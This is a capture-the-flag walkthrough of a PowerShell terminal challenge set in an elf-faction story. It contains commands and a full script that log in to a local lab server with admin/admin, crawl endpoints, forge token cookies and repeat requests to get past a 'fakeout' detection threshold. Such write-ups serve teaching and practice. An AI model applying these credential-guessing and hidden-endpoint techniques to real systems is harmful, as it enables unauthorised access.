### PowerShell
Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.<br>
Difficulty: 3/5<br>
Solved: Silver

---

***Piney Sappington***
> Hey there, friend! Piney Sappington here.<br><br>
You've probably heard the latest—things are getting tense around here with all the faction business
between Wombley and Alabaster. But, let’s focus on this PowerShell Terminal for now.<br><br>
This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter
intruders, but the system is in a faulty lockdown state.<br><br>
I certainly wasn't the one that programmed the mechanism. Nope not me. But can you help me find a way
through it so I can regain access?<br><br>
There's two functions I need access to. The snow cannon terminal, which should be easier. And the snow
cannon production and deployment plans. That one's better defended.<br><br>
Still, I've got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.<br><br>
So, think you can do it? Are you ready to show what you've got?

---

### Silver Solution
#### Challenge 1
*There is a file in the current directory called 'welcome.txt'. Read the contents of this file*
> System Overview<br>
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.<br><br>
Lockdown Protocols<br>
When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.<br><br>
Access and System Restoration<br>
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.

```Powershell
PS /home/user> Get-Content "welcome.txt"
```


#### Challenge 2
*Geez that sounds ominous, I'm sure we can get past the defense mechanisms.*
*We should warm up our PowerShell skills.*
*How many words are there in the file?*
> 180

We read the contents of the file and split the contents into individual words. Lastly we count the individual words.

```Powershell
PS /home/user> (Get-Content "welcome.txt").Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries).Count
```

#### Challenge 3
*There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?*
> 1225

We use `netstat -an` to get all active connections, listening connections, and unix sockets. Then we use `Select-String -Pattern "TCP|UDP"` and `Select-String -Pattern "listen"` to get only listening connections. Next we use `ForEach-Object { ($_ -split "\s+")[3] }` get the local address which is the IP Address and port that the machine is listening on. The local address entries are in form `IP:Port`, so we use `ForEach-Object { ($_ -split ":")[0] }`  to get the IP and `ForEach-Object { ($_ -split ":")[1] }` to get the port.

Then we use `Select-String` to get lines with both the words `listen` and  `localhost` to 

```Powershell
PS /home/user> $ip = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[0] } 

PS /home/user> $port = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[1] } 
PS /home/user> $port
```

#### Challenge 4
*You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?*
> 401 (UNAUTHORIZED)

```Powershell
PS /home/user> $baseuri = "http://${ip}:${port}"
PS /home/user> $resp = Invoke-WebRequest -Uri $baseuri
```

#### Challenge 5
*It looks like defensive measures are in place, it is protected by basic authentication.*
*Try authenticating with a standard admin username and password.*

We authenticate with the username `admin` and the password `admin`:

```Powershell
PS /home/user> $user = "admin"
PS /home/user> $pass = "admin" | ConvertTo-SecureString -AsPlainText -Force
PS /home/user> $credential = New-Object System.Management.Automation.PSCredential ($user, $pass)

PS /home/user> $resp = Invoke-WebRequest -Uri $baseuri -AllowUnencryptedAuthentication -Credential $credential
PS /home/user> $resp
```

#### Challenge 6
*There are too many endpoints here.*
*Use a loop to download the contents of each page. What page has 138 words?*
*When you find it, communicate with the URL and print the contents to the terminal.*
> http://127.0.0.1:1225/endpoints/13

First we get an initial HTTP Response `$resp` from the website. Next we use `Select-Object -ExpandProperty href` to get list of all the links from the response. Next we use `$link -replace '^http://[^/]+', ''` to extract the actual endpoint from each link. Next we remove all the `/` characters from the `$endpoint` to make the file name `$outputFile`. Lastly we use `Invoke-WebRequest` to get the content of each page and `$response.Content | Out-File -FilePath $outputFile` to save each page as a file.

```Powershell
PS /home/user> $resp = Invoke-WebRequest -Uri $baseuri -AllowUnencryptedAuthentication -Credential $credential
PS /home/user> $links = $resp.Links | Select-Object -ExpandProperty href

PS /home/user> foreach ($link in $links) {
    $endpoint = $link -replace '^http://[^/]+', ''
    $outputFile = $endpoint -replace '/' , ''
    $response = Invoke-WebRequest -Uri $link
    $response.Content | Out-File -FilePath $outputFile
}
```

Next for every link in the list of links from the website `links`, we extract the actual endpoint `$endpoint`. Next we get the corresponding downloaded file to each endpoint. Then we get the word count of each downloaded `$outputFile` and if the `$wordCount` is equal to 138, we stop looking because we have found the endpoint.

```Powershell
PS /home/user> $endpoint = $null

PS /home/user> foreach ($link in $links) {

    $endpoint = $link -replace '^http://[^/]+', ''
    $outputFile = $endpoint -replace '/' , ''

    $wordCount = (Get-Content -Path $outputFile -Raw).Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries).Count

    if ($wordCount -eq 138) {
        Write-Host "$baseuri/$endpoint"
        break
    }
    
}
```

Next we get the content of the webpage we found:

```Powershell
PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$endpoint" -AllowUnencryptedAuthentication -Credential $credential
PS /home/user> $resp.Content
```

#### Challenge 7
*There seems to be a csv file in the comments of that page.*
*That could be valuable, read the contents of that csv-file!*

First we use the command `Select-String -Pattern "http://[^\s]+\.csv"` to search the page contents for a link to a csv file. Next we extract the endpoint from the link using to command `ForEach-Object { $_ -replace '^http://[^/]+', '' }`. Lastly, we get the contents of the csv file:

```Powershell
PS /home/user> $csv_endpoint = $resp.Content | Select-String -Pattern "http://[^\s]+\.csv" | ForEach-Object { $_.Matches.Value } | ForEach-Object { $_ -replace '^http://[^/]+', '' } | Select-Object -First 1

PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$csv_endpoint" -AllowUnencryptedAuthentication -Credential $credential
PS /home/user> $resp.Content
```
 
#### Challenge 8
*Luckily the defense mechanisms were faulty!*
*There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!*
> `tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`


out is: file_MD5hash,Sha256(file_MD5hash)
see format
```powershell
PS /home/user> $resp.Content -split "`n"  | Select-Object -First 1
```

```powershell
PS /home/user> $md5 = $resp.Content -split "`n" | Where-Object { $_ -match "^[a-f0-9]{32},[a-f0-9]{64}" } | ForEach-Object { $_.Substring(0,32) }
PS /home/user> $sha256 = $resp.Content -split "`n" | Where-Object { $_ -match "^[a-f0-9]{32},[a-f0-9]{64}" } | ForEach-Object { $_.Substring(33) }
PS /home/user> $verification_endpoint = $resp.Content -split "\s+" | Where-Object { $_ -match "^http://([^/]+/)+" } | ForEach-Object { $_ -replace '^http://[^/]+', '' }

PS /home/user> $nonredacted_endpoint = $verification_endpoint -replace "<sha256sum>", $sha256
PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$nonredacted_endpoint" -AllowUnencryptedAuthentication -Credential $credential
PS /home/user> $resp.Content 
```


#### Challenge 9
*It looks like it requires a cookie token, set the cookie and try again.*

We set the cookie named `token` to the md5 hash `md5` of the api-endpoint:

```Powershell
PS /home/user> $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
PS /home/user> $cookie = New-Object System.Net.Cookie("token", $md5, "/", $baseuri.split("//")[1].split(":")[0])
PS /home/user> $webSession.Cookies.Add($cookie)
```

Now we communicate with the endpoint:

```Powershell
PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$nonredacted_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession
PS /home/user> $resp.Content
```

#### Challenge 10
*Sweet we got a MFA token! We might be able to get access to the system.*
*Validate that token at the endpoint!*

The MFA token expires, so we need to get the MFA token from the webpage and add it as a cookie using PowerShell in the same command. Can use ; to chain commands We use the command `Select-Object -ExpandProperty href` to get the mfa token, which is inside the `<a>` html tag. We use the command `Select-Object -ExpandProperty outerHTML | ForEach-Object { $_ -replace '<a[^>]*>(.*?)</a>', '$1' }` to get the text inside the `<a>` html tags to get the mfa endpoint. We add the mfa token as a cookie and then get the webpage:

```Powershell
PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$nonredacted_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession;

PS /home/user> $mfa_token = $resp.Links | Select-Object -ExpandProperty href;
PS /home/user> $mfa_endpoint = $resp.Links | Select-Object -ExpandProperty outerHTML | ForEach-Object { $_ -replace '<a[^>]*>(.*?)</a>', '$1' };

PS /home/user> $cookie = New-Object System.Net.Cookie("mfa_token", $mfa_token, "/", $baseuri.split("//")[1].split(":")[0]);
PS /home/user> $webSession.Cookies.Add($cookie);

PS /home/user> $resp = Invoke-WebRequest -Uri "$baseuri$mfa_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession;
PS /home/user> $resp.Content;

```
 


#### Challenge 11
*That looks like base64! Decode it so we can get the final secret!*
> Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction

We use the command `Select-String -pattern "<p.*?>(.*?)</p> " -AllMatches | ForEach-Object { $_.Matches.Value } ` to get the html `<p>` attribute. Then we use `ForEach-Object {$_ -replace '<[^>]+>', '' }` to get the text inside the `<p>` tags:

```Powershell
PS /home/user> $b64 = $resp.Content | Select-String -pattern "<p.*?>(.*?)</p>" -AllMatches | ForEach-Object { $_.Matches.Value } | ForEach-Object {$_ -replace '<[^>]+>', '' }
PS /home/user> $decodedBytes = [Convert]::FromBase64String($b64)
PS /home/user> $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
PS /home/user> $decodedString
```

We receive the success message: 

```
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction
```

---

***Piney Sappington***
> Fantastic work! You've navigated PowerShell’s tricky waters and retrieved the codeword—just what we need in these uncertain times. You're proving yourself a real asset!<br><br>
I'll let you in on a little secret—there’s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!

---

### Hints

***PowerShell Admin Access - Fakeout EDR Threshold***<br>
From: Piney Sappington<br>
They also mentioned this lazy elf who programmed the security settings in the weapons terminal.
He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system
is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared
between endpoints!

***PowerShell Admin Access - Total Control***<br>
From: Piney Sappington<br>
I overheard some of the other elves talking. Even though the endpoints have been redacted, they
are still operational. This means that you can probably elevate your access by communicating with
them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one
of them is still active and can be tested against. Try hashing the token with SHA256 and see if you
can reliably reproduce the endpoint. This might help, pipe the tokens to "Get-FileHash -Algorithm
SHA256".

### Gold Solution

Since the redacted endpoints remain operational, we can reproduce them. First we save each MD5 Hash to a file, and the we generate the the SHA256 File Hash of each file. Next for each of our reproduced
endpoints, we send one more request than the EDR Threshold:

```Powershell
PS /home/user> New-Item -Path . -Name "soln.ps1" -ItemType File

PS /home/user> Set-Content -Path "soln.ps1" -Value @'
$ip = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[0] } 
$port = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[1] } 
$baseuri = "http://${ip}:${port}"

$user = "admin"
$pass = "admin" | ConvertTo-SecureString -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($user, $pass)

$Headers = @{ Authorization = "Basic $credential"}

$resp = Invoke-WebRequest -Uri $baseuri -AllowUnencryptedAuthentication -Credential $credential

$links = $resp.Links | Select-Object -ExpandProperty href
$endpoint = $null

foreach ($link in $links) {

    $endpoint = $link -replace '^http://[^/]+', ''
    $outputFile = $endpoint -replace '/' , ''
    $response = Invoke-WebRequest -Uri $link
    $response.Content | Out-File -FilePath $outputFile
    
}

$resp = Invoke-WebRequest -Uri "$baseuri$endpoint" -AllowUnencryptedAuthentication -Credential $credential

$csv_endpoint = $resp.Content | Select-String -Pattern "http://[^\s]+\.csv" | ForEach-Object { $_.Matches.Value } | ForEach-Object { $_ -replace '^http://[^/]+', '' } | Select-Object -First 1

$resp = Invoke-WebRequest -Uri "$baseuri$csv_endpoint" -AllowUnencryptedAuthentication -Credential $credential
$redacted_endpoints = $resp.Content -split "`n" | Where-Object { $_ -match "^[a-f0-9]{32},REDACTED" }

$verification_endpoint = $resp.Content -split "\s+" | Where-Object { $_ -match "^http://([^/]+/)+" } | ForEach-Object { $_ -replace '^http://[^/]+', '' }

foreach ($endpoint in $redacted_endpoints) {

    $md5 = $endpoint.Substring(0, 32)
    $outputFile = $md5
    $md5 | Out-File -FilePath $outputFile

    $sha256 = (Get-FileHash -Path $outputFile -Algorithm SHA256).Hash
 

    $redacted_endpoint = $verification_endpoint -replace "<sha256sum>", $sha256

    $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    $cookie = New-Object System.Net.Cookie("token", $md5, "/", $baseuri.split("//")[1].split(":")[0])
    $webSession.Cookies.Add($cookie);

    $resp = Invoke-WebRequest -Uri "$baseuri$redacted_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession
   
    $mfa_token = $resp.Links | Select-Object -ExpandProperty href
   
    $mfa_endpoint = $resp.Links | Select-Object -ExpandProperty outerHTML | ForEach-Object { $_ -replace '<a[^>]*>(.*?)</a>', '$1' };
  
    $cookie2 = New-Object System.Net.Cookie("mfa_token", $mfa_token, "/", $baseuri.split("//")[1].split(":")[0]);
    $webSession.Cookies.Add($cookie2)
   
    $threshold = ($resp.Content -split '<br>' | Where-Object { $_ -match 'fakeout threshold set to (\d+)' } | ForEach-Object { $Matches[1] })

    for ($i = 0; $i -le [int]$threshold; $i++) {
       
        $resp = Invoke-WebRequest -Uri "$baseuri$mfa_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession
      
        if ($resp.Content -match '\[\+\]') {
            
            $resp.Content
            break
          

        }

    }
     
}
'@

PS /home/user> ./soln.ps1
```

We get a success message:

```
<h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
```

---

***Piney Sappington***
> Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.<br><br>
Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need—keep up the great work! <br><br>

---